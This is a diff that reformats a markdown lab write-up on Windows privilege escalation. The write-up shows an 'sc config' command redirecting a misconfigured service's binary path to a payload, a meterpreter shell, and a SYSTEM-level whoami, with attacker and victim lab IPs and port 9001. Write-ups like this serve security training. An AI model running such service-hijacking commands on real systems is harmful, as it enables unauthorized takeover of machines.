@@ -403,8 +403,10 @@ sc config daclsvc binpath= "C:\PrivEsc\privesc.exe"
 [SC] ChangeServiceConfig SUCCESS
 ```
 
+```
 |------Field--------|-----------------------Before-------------------|---------------After--------|
 |BINARY_PATH_NAME   |C:\Program Files\DACL Service\daclservice.exe   |C:\PrivEsc\privesc.exe      |
+```
 
 <p align="center">
   <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step11-2.png" width="600">
@@ -431,9 +433,10 @@ meterpreter > shell
 C:\Windows\system32>whoami
 nt authority\system
 ```
-Attacker IP: `192.168.5.128`
-Victim IP: `192.168.5.129`
-Port: `9001`
-Privilege: `nt authority\system`
+
+- Attacker IP: `192.168.5.128`
+- Victim IP: `192.168.5.129`
+- Port: `9001`
+- Privilege: `nt authority\system`
 
 I went from a normal low privilege user account all the way to nt authority\system just by changing the binary path of a misconfigured service.
